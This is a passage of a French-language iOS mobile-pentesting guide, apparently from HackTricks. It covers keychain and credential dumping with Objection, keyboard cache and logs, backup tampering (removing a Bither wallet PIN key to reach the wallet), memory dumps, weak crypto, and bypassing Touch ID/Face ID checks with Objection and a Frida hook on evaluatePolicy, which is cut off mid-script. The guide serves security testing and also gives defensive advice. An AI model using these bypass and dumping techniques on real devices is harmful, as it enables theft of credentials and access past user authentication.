func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C :
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Cela d√©finit l'image de fond √† `overlayImage.png` chaque fois que l'application est mise en arri√®re-plan. Cela emp√™che les fuites de donn√©es sensibles car `overlayImage.png` remplacera toujours la vue actuelle.

### Trousseau

Des outils comme [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) peuvent √™tre utilis√©s pour vider le trousseau (l'appareil doit √™tre jailbreak√©).\
Vous pouvez √©galement utiliser `ios keychain dump` de [**Objection**](https://github.com/sensepost/objection)**.**

**NSURLCredential**

**NSURLCredential** est la classe parfaite pour **stocker le nom d'utilisateur et le mot de passe dans le trousseau**. Pas besoin de se soucier de NSUserDefaults ni d'aucun wrapper de trousseau.\
Une fois l'utilisateur connect√©, vous pouvez stocker son nom d'utilisateur et son mot de passe dans le trousseau :
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Vous pouvez utiliser `ios nsurlcredentialstorage dump` de **Objection** pour extraire ces secrets.

## Claviers Personnalis√©s/Cache du Clavier

√Ä partir d'iOS 8.0, Apple permet d'installer des extensions personnalis√©es pour iOS, comme des claviers personnalis√©s.\
Les claviers install√©s peuvent √™tre g√©r√©s via **R√©glages** > **G√©n√©ral** > **Clavier** > **Claviers**\
Les claviers personnalis√©s peuvent √™tre utilis√©s pour **espionner** les **frappes** et les envoyer au serveur de l'attaquant. Cependant, notez que **les claviers personnalis√©s n√©cessitant une connectivit√© r√©seau seront signal√©s √† l'utilisateur.**\
De plus, **l'utilisateur peut passer √† un autre** (plus fiable) **clavier** pour introduire les identifiants.

De plus, **les applications peuvent emp√™cher leurs utilisateurs d'utiliser des claviers personnalis√©s** au sein de l'application (ou du moins pour les parties sensibles de l'application).

{% hint style="warning" %}
Il est recommand√© de ne pas autoriser les claviers tiers si vous consid√©rez que les utilisateurs n'en auront pas besoin.
{% endhint %}

Notez qu'en raison de la correction automatique et des suggestions automatiques, le clavier iOS par d√©faut capturera et stockera chaque mot non standard dans un fichier cache si l'attribut **secureTextEntry** n'est pas d√©fini sur **true** ou si **autoCorrectionType** n'est pas d√©fini sur **UITextAutoCorrectionTypeNo.**

Par d√©faut, les claviers **stockent ce cache** √† l'int√©rieur du bac √† sable des applications dans le fichier `Library/Keyboard/{locale}-dynamic-text.dat` ou dans `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Cependant, il se pourrait qu'il sauvegarde les donn√©es ailleurs.\
Il est possible de r√©initialiser le cache dans _**R√©glages**_ > _**G√©n√©ral**_ > _**R√©initialiser**_ > _**R√©initialiser le dictionnaire du clavier**_

{% hint style="info" %}
Par cons√©quent, **v√©rifiez toujours ces fichiers** et recherchez des **informations sensibles** possibles.\
**Intercepter le trafic r√©seau** est une autre mani√®re de v√©rifier si le clavier personnalis√© envoie des frappes √† un serveur distant.
{% endhint %}

Le [protocole UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) est utilis√© pour la mise en cache du clavier. Les classes UITextField, UITextView et UISearchBar prennent automatiquement en charge ce protocole et il offre les propri√©t√©s suivantes :

* `var autocorrectionType: UITextAutocorrectionType` d√©termine si la correction automatique est activ√©e pendant la frappe. Lorsque la correction automatique est activ√©e, l'objet texte suit les mots inconnus et sugg√®re des remplacements appropri√©s, rempla√ßant automatiquement le texte tap√© √† moins que l'utilisateur ne remplace la correction. La valeur par d√©faut de cette propri√©t√© est `UITextAutocorrectionTypeDefault`, qui pour la plupart des m√©thodes de saisie active la correction automatique.
* `var secureTextEntry: BOOL` d√©termine si la copie de texte et la mise en cache du texte sont d√©sactiv√©es et masque le texte saisi pour `UITextField`. La valeur par d√©faut de cette propri√©t√© est `NO`.

**Pour identifier ce comportement dans le code :**

* Recherchez dans le code source des impl√©mentations similaires, telles que
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Ouvrez les fichiers xib et storyboard dans `Interface Builder` de Xcode et v√©rifiez les √©tats de `Secure Text Entry` et `Correction` dans `Attributes Inspector` pour l'objet appropri√©.

L'application doit emp√™cher la mise en cache des informations sensibles saisies dans les champs de texte. Vous pouvez emp√™cher la mise en cache en la d√©sactivant de mani√®re programmatique, en utilisant la directive `textObject.autocorrectionType = UITextAutocorrectionTypeNo` dans les UITextFields, UITextViews et UISearchBars souhait√©s. Pour les donn√©es qui doivent √™tre masqu√©es, telles que les PINs et les mots de passe, d√©finissez `textObject.secureTextEntry` sur `YES`.
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Journaux**

La mani√®re la plus courante de d√©boguer du code est l'utilisation de journaux, et l'application **peut imprimer des informations sensibles dans les journaux**.\
Dans les versions iOS 6 et ant√©rieures, les journaux √©taient lisibles par tous (une application malveillante pouvait lire les journaux d'autres applications et en extraire des informations sensibles). **De nos jours, les applications ne peuvent acc√©der qu'√† leurs propres journaux**.

Cependant, un **attaquant** avec un **acc√®s physique** √† un appareil **d√©verrouill√©** peut le connecter √† un ordinateur et **lire les journaux** (notez que les journaux √©crits sur le disque par une application ne sont pas supprim√©s si l'application est d√©sinstall√©e).

Il est recommand√© de **naviguer √† travers tous les √©crans** de l'application et d'**interagir** avec **chaque** √©l√©ment de l'interface utilisateur et **fonctionnalit√©** et de fournir du texte dans tous les champs de texte et **examiner les journaux** √† la recherche d'**informations sensibles** expos√©es.

Utilisez les mots-cl√©s suivants pour v√©rifier le code source de l'application pour les d√©clarations de journalisation pr√©d√©finies et personnalis√©es :

* Pour les fonctions pr√©d√©finies et int√©gr√©es :
  * NSLog
  * NSAssert
  * NSCAssert
  * fprintf
* Pour les fonctions personnalis√©es :
  * Logging
  * Logfile

**Surveillance des journaux syst√®me**

De nombreuses applications enregistrent des messages informatifs (et potentiellement sensibles) dans le journal de la console. Le journal contient √©galement des rapports de plantage et d'autres informations utiles.

Vous pouvez utiliser ces outils :
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Vous pouvez collecter les journaux de la console via la fen√™tre **Devices** de Xcode comme suit :

1. Lancez Xcode.
2. Connectez votre appareil √† votre ordinateur h√¥te.
3. Choisissez **Window** -> **Devices and Simulators**.
4. Cliquez sur votre appareil iOS connect√© dans la section de gauche de la fen√™tre Devices.
5. Reproduisez le probl√®me.
6. Cliquez sur le bouton **Open Console** situ√© dans la partie sup√©rieure droite de la fen√™tre Devices pour afficher les journaux de la console dans une fen√™tre s√©par√©e.

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (15).png>)

Vous pouvez √©galement vous connecter au shell de l'appareil comme expliqu√© dans Acc√®s au Shell de l'Appareil, installez **socat** via **apt-get** et ex√©cutez la commande suivante :
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** gr√¢ce aux outils communautaires **les plus avanc√©s**.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sauvegardes

iOS inclut des fonctionnalit√©s de sauvegarde automatique qui cr√©ent des copies des donn√©es stock√©es sur l'appareil. Vous pouvez **faire des sauvegardes iOS** depuis votre ordinateur h√¥te en utilisant iTunes (jusqu'√† macOS Catalina) ou Finder (√† partir de macOS Catalina), ou via la fonctionnalit√© de sauvegarde iCloud. Dans les deux cas, la sauvegarde comprend presque toutes les donn√©es stock√©es sur l'appareil iOS √† l'exception des donn√©es hautement sensibles telles que les informations Apple Pay et les param√®tres Touch ID.

Comme iOS sauvegarde les applications install√©es et leurs donn√©es, une pr√©occupation √©vidente est de savoir si **les donn√©es sensibles de l'utilisateur** stock√©es par l'application pourraient **fuiter involontairement √† travers la sauvegarde**. Une autre pr√©occupation, bien que moins √©vidente, est de savoir si **les param√®tres de configuration sensibles utilis√©s pour prot√©ger les donn√©es ou restreindre les fonctionnalit√©s de l'application pourraient √™tre alt√©r√©s pour changer le comportement de l'application apr√®s la restauration d'une sauvegarde modifi√©e**. Ces deux pr√©occupations sont valables et ces vuln√©rabilit√©s se sont av√©r√©es exister dans un grand nombre d'applications aujourd'hui.

Une sauvegarde d'un appareil sur lequel une application mobile a √©t√© install√©e inclura tous les sous-r√©pertoires (√† l'exception de `Library/Caches/`) et fichiers dans [le r√©pertoire priv√© de l'application](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW12).\
Par cons√©quent, **√©vitez de stocker des donn√©es sensibles en texte clair dans l'un des fichiers ou dossiers qui se trouvent dans le r√©pertoire priv√© de l'application ou ses sous-r√©pertoires**.

Bien que tous les fichiers dans `Documents/` et `Library/Application Support/` soient toujours sauvegard√©s par d√©faut, vous pouvez [exclure des fichiers de la sauvegarde](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW28) en appelant `NSURL setResourceValue:forKey:error:` avec la cl√© `NSURLIsExcludedFromBackupKey`.\
Vous pouvez utiliser les propri√©t√©s du syst√®me de fichiers [NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple\_ref/c/data/NSURLIsExcludedFromBackupKey) et [CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple\_ref/c/data/kCFURLIsExcludedFromBackupKey) pour exclure des fichiers et r√©pertoires des sauvegardes.

{% hint style="warning" %}
Par cons√©quent, lors de la v√©rification de la sauvegarde d'une application, vous devez v√©rifier si **des informations sensibles** sont accessibles et si vous pouvez **modifier un comportement sensible** de l'application en **modifiant certains param√®tres de la sauvegarde** et en restaurant la sauvegarde.
{% endhint %}

**Comment tester**

Commencez par **cr√©er une sauvegarde de l'appareil** (vous pouvez le faire en utilisant Finder) et trouvez o√π la sauvegarde est stock√©e. La documentation officielle d'Apple vous aidera √† [localiser les sauvegardes de votre iPhone, iPad et iPod touch](https://support.apple.com/en-us/HT204215).

Une fois que vous avez trouv√© la sauvegarde de l'appareil (`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`), vous pouvez commencer √† rechercher des informations sensibles en utilisant par exemple grep, ou en utilisant des outils comme [iMazing](https://imazing.com)).

Pour identifier si une sauvegarde est chiffr√©e, vous pouvez v√©rifier la cl√© nomm√©e "IsEncrypted" dans le fichier "Manifest.plist", situ√© √† la racine du r√©pertoire de sauvegarde. L'exemple suivant montre une configuration indiquant que la sauvegarde est chiffr√©e :
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
```markdown
Si vous devez travailler avec une sauvegarde chiffr√©e, il existe des scripts Python dans [le d√©p√¥t GitHub de DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), tels que **backup_tool.py** et **backup_passwd.py**, qui constitueront un bon point de d√©part. Cependant, notez qu'ils pourraient ne pas fonctionner avec les derni√®res versions d'iTunes/Finder et pourraient n√©cessiter des ajustements.

Vous pouvez √©galement utiliser l'outil [**iOSbackup**](https://pypi.org/project/iOSbackup/) pour lire et extraire facilement des fichiers d'une sauvegarde iOS chiffr√©e par mot de passe.

**Comment modifier le comportement**

Dans l'application open source de portefeuille bitcoin, [Bither](https://github.com/bither/bither-ios), vous verrez qu'il est possible de configurer un PIN pour verrouiller l'interface utilisateur.\
Ce PIN est stock√© dans le fichier `net.bither.plist` √† l'int√©rieur de la **cl√©** **pin_code**.\
Si vous effacez cette cl√© de ce plist dans la sauvegarde et restaurez la sauvegarde, vous pourrez acc√©der au portefeuille.

## Tester la m√©moire pour des donn√©es sensibles

√Ä un moment donn√©, des informations sensibles vont √™tre stock√©es en m√©moire. L'objectif est de s'assurer que ces informations sont expos√©es aussi bri√®vement que possible.

Pour enqu√™ter sur la m√©moire d'une application, commencez par cr√©er un **dump de m√©moire**. Alternativement, vous pouvez **analyser la m√©moire en temps r√©el** avec, par exemple, un d√©bogueur. Peu importe la m√©thode utilis√©e, c'est un processus tr√®s sujet √† erreur car les dumps fournissent les donn√©es laiss√©es par les fonctions ex√©cut√©es et vous pourriez manquer d'ex√©cuter des √©tapes critiques. De plus, il est assez facile de n√©gliger des donn√©es pendant l'analyse √† moins de conna√Ætre l'empreinte des donn√©es que vous recherchez (soit leur valeur exacte, soit leur format). Par exemple, si l'application chiffre selon une cl√© sym√©trique g√©n√©r√©e al√©atoirement, il est tr√®s peu probable que vous rep√©riez la cl√© en m√©moire √† moins de trouver sa valeur par d'autres moyens.

**R√©cup√©ration et analyse d'un dump de m√©moire**

Que vous utilisiez un appareil jailbreak√© ou non, vous pouvez dumper la m√©moire du processus de l'application avec [objection](https://github.com/sensepost/objection) et [Fridump](https://github.com/Nightbringer21/fridump).

Apr√®s que la m√©moire ait √©t√© dump√©e (par exemple dans un fichier appel√© "memory"), en fonction de la nature des donn√©es que vous recherchez, vous aurez besoin d'un ensemble d'outils diff√©rents pour traiter et analyser ce dump de m√©moire. Par exemple, si vous vous concentrez sur les cha√Ænes de caract√®res, il pourrait vous suffire d'ex√©cuter la commande `strings` ou `rabin2 -zz` pour extraire ces cha√Ænes.
```
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Ouvrez `strings.txt` dans votre √©diteur pr√©f√©r√© et examinez-le pour identifier des informations sensibles.

Cependant, si vous souhaitez inspecter d'autres types de donn√©es, vous pr√©f√©rerez utiliser radare2 et ses capacit√©s de recherche. Consultez l'aide de radare2 sur la commande de recherche (`/?`) pour plus d'informations et une liste d'options. Voici seulement un sous-ensemble d'entre elles :
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**Analyse de la m√©moire en temps r√©el**

En utilisant [**r2frida**](https://github.com/nowsecure/r2frida), vous pouvez analyser et inspecter la m√©moire de l'application pendant son ex√©cution sans avoir √† la vider. Par exemple, vous pouvez ex√©cuter les commandes de recherche pr√©c√©dentes depuis r2frida et chercher dans la m√©moire une cha√Æne de caract√®res, des valeurs hexad√©cimales, etc. Lorsque vous faites cela, n'oubliez pas de pr√©fixer la commande de recherche (et toute autre commande sp√©cifique √† r2frida) avec un antislash `\` apr√®s avoir d√©marr√© la session avec `r2 frida://usb//<nom_de_votre_application>`.

## Cryptographie d√©fectueuse

### Processus de gestion de cl√©s m√©diocre

Certains d√©veloppeurs enregistrent des donn√©es sensibles dans le stockage local et les chiffrent avec une cl√© cod√©e en dur/pr√©visible dans le code. Cela ne devrait pas √™tre fait car un peu de r√©tro-ing√©nierie pourrait permettre aux attaquants d'extraire les informations confidentielles.

### Utilisation d'algorithmes non s√©curis√©s et/ou obsol√®tes

Les d√©veloppeurs ne devraient pas utiliser **d'algorithmes obsol√®tes** pour effectuer des **v√©rifications** d'autorisation, **stocker** ou **envoyer** des donn√©es. Certains de ces algorithmes sont : RC4, MD4, MD5, SHA1... Si des **hashs** sont utilis√©s pour stocker des mots de passe par exemple, des hashs **r√©sistants** au **brute-force** devraient √™tre utilis√©s avec du sel.

### V√©rification

Les principales v√©rifications √† effectuer sont de trouver si vous pouvez trouver des mots de passe/secrets **cod√©s en dur** dans le code, ou si ceux-ci sont **pr√©visibles**, et si le code utilise une sorte d'algorithmes de **cryptographie** **faible**.

Il est int√©ressant de savoir que vous pouvez **surveiller** certaines **biblioth√®ques** **crypto** automatiquement en utilisant **objection** avec :
```swift
ios monitor crypt
```
Pour **plus d'informations** sur les API et biblioth√®ques cryptographiques iOS, acc√©dez √† [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Authentification Locale

Le testeur doit √™tre conscient que **l'authentification locale doit toujours √™tre appliqu√©e √† un point de terminaison distant** ou bas√©e sur un primitif cryptographique. Les attaquants peuvent facilement contourner l'authentification locale si aucune donn√©e ne r√©sulte du processus d'authentification.

Le [**cadre d'authentification locale**](https://developer.apple.com/documentation/localauthentication) fournit un ensemble d'API pour permettre aux d√©veloppeurs de pr√©senter une bo√Æte de dialogue d'authentification √† l'utilisateur. Dans le contexte de la connexion √† un service distant, il est possible (et recommand√©) d'utiliser le [trousseau](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) pour mettre en ≈ìuvre l'authentification locale.

Le capteur **d'identification par empreinte digitale** est g√©r√© par le [coprocesseur de s√©curit√© SecureEnclave](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf) et ne divulgue pas les donn√©es d'empreinte digitale √† d'autres parties du syst√®me. En plus de Touch ID, Apple a introduit _Face ID_ : qui permet l'authentification bas√©e sur la reconnaissance faciale.

Les d√©veloppeurs ont deux options pour int√©grer l'authentification Touch ID/Face ID :

* `LocalAuthentication.framework` est une API de haut niveau qui peut √™tre utilis√©e pour **authentifier l'utilisateur via Touch ID**. L'application ne peut pas acc√©der √† aucune donn√©e associ√©e √† l'empreinte digitale enregistr√©e et est seulement notifi√©e si l'authentification a r√©ussi.
* `Security.framework` est une API de niveau inf√©rieur pour acc√©der aux [services de trousseau](https://developer.apple.com/documentation/security/keychain\_services). C'est une option s√©curis√©e si votre application a besoin de **prot√©ger certaines donn√©es secr√®tes avec une authentification biom√©trique**, puisque le contr√¥le d'acc√®s est g√©r√© au niveau du syst√®me et ne peut pas √™tre facilement contourn√©. `Security.framework` a une API en C, mais il existe plusieurs [enveloppes open source disponibles](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id), rendant l'acc√®s au trousseau aussi simple qu'√† NSUserDefaults.

{% hint style="danger" %}
Veuillez √™tre conscient qu'en utilisant soit le `LocalAuthentication.framework` soit le `Security.framework`, cela sera un contr√¥le qui peut √™tre contourn√© par un attaquant car il ne retourne qu'une valeur bool√©enne et aucune donn√©e pour continuer. Voir [Don't touch me that way, par David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM) pour plus de d√©tails.
{% endhint %}

### Cadre d'Authentification Locale

Les d√©veloppeurs peuvent afficher une **invite d'authentification** en utilisant la fonction **`evaluatePolicy`** de la classe **`LAContext`**. Deux politiques disponibles d√©finissent les formes acceptables d'authentification :

* `deviceOwnerAuthentication`(Swift) ou `LAPolicyDeviceOwnerAuthentication`(Objective-C) : Lorsqu'elle est disponible, l'utilisateur est invit√© √† effectuer une authentification Touch ID. Si Touch ID n'est pas activ√©, le code d'acc√®s de l'appareil est demand√© √† la place. Si le code d'acc√®s de l'appareil n'est pas activ√©, l'√©valuation de la politique √©choue.
* `deviceOwnerAuthenticationWithBiometrics` (Swift) ou `LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C) : L'authentification est limit√©e aux biom√©tries o√π l'utilisateur est invit√© pour Touch ID.

La fonction **`evaluatePolicy` renvoie une valeur bool√©enne** indiquant si l'utilisateur s'est authentifi√© avec succ√®s. Ce qui signifie qu'elle peut √™tre facilement contourn√©e (voir ci-dessous)

### Authentification Locale avec Trousseau

Les **API du trousseau iOS peuvent (et doivent) √™tre utilis√©es pour mettre en ≈ìuvre l'authentification locale**. Au cours de ce processus, l'application stocke soit un jeton d'authentification secret, soit une autre pi√®ce de donn√©es secr√®tes identifiant l'utilisateur dans le trousseau. Pour s'authentifier √† un service distant, l'utilisateur doit d√©verrouiller le trousseau en utilisant son mot de passe ou son empreinte digitale pour obtenir les donn√©es secr√®tes.

Le trousseau permet de sauvegarder des √©l√©ments avec l'attribut sp√©cial `SecAccessControl`, qui permettra l'acc√®s √† l'√©l√©ment du trousseau uniquement apr√®s que l'utilisateur a pass√© l'authentification Touch ID (ou code d'acc√®s, si un tel retour est autoris√© par les param√®tres d'attribut).

Dans l'exemple suivant, nous allons sauvegarder la cha√Æne "test\_strong\_password" dans le trousseau. La cha√Æne ne peut √™tre acc√©d√©e que sur l'appareil actuel tandis que le code d'acc√®s est d√©fini (param√®tre `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`) et apr√®s l'authentification Touch ID pour les doigts actuellement enregistr√©s seulement (param√®tre `SecAccessControlCreateFlags.biometryCurrentSet`) :

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
```markdown
{% endtab %}

{% tab title="Objective-C" %}
```
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
```markdown
{% endtab %}
{% endtabs %}

Nous pouvons maintenant demander l'√©l√©ment enregistr√© dans le trousseau. Les services de trousseau pr√©senteront la bo√Æte de dialogue d'authentification √† l'utilisateur et retourneront des donn√©es ou nil selon qu'une empreinte digitale appropri√©e a √©t√© fournie ou non.

{% tabs %}
{% tab title="Swift" %}
```
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### D√©tection

L'utilisation de frameworks dans une application peut √©galement √™tre d√©tect√©e en analysant la liste des biblioth√®ques dynamiques partag√©es du binaire de l'application. Cela peut √™tre fait en utilisant `otool` :
```bash
$ otool -L <AppName>.app/<AppName>
```
Si `LocalAuthentication.framework` est utilis√© dans une application, la sortie contiendra les deux lignes suivantes (rappelez-vous que `LocalAuthentication.framework` utilise `Security.framework` sous le capot) :
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
### Contournement du Framework d'Authentification Locale

#### Objection

[**Contournement Biom√©trique avec Objection**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) peut √™tre utilis√© pour contourner LocalAuthentication. Objection **utilise Frida pour manipuler la fonction `evaluatePolicy` afin qu'elle retourne `True`** m√™me si l'authentification n'a pas √©t√© effectu√©e avec succ√®s. Utilisez la commande `ios ui biometrics_bypass` pour contourner l'authentification biom√©trique non s√©curis√©e. Objection enregistrera un travail, qui remplacera le r√©sultat de `evaluatePolicy`. Cela fonctionnera √† la fois dans les impl√©mentations Swift et Objective-C.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Si vuln√©rable, le module contournera automatiquement le formulaire de connexion.

#### Frida

Un exemple d'utilisation de **`evaluatePolicy`** √† partir de l'[application DVIA-v2](https://github.com/prateek147/DVIA-v2) :
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Pour contourner l'Authentification Locale, nous devons √©crire un script Frida qui **contourne** la v√©rification _**evaluatePolicy**_ mentionn√©e ci-dessus. Comme vous pouvez le voir dans l'extrait de code coll√© ci-dessus, **evaluatePolicy** utilise un **callback** qui d√©termine le **r√©sultat**. Ainsi, la mani√®re la plus simple de r√©aliser le piratage est d'intercepter ce callback et de s'assurer qu'il retourne toujours _**success=1**_.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
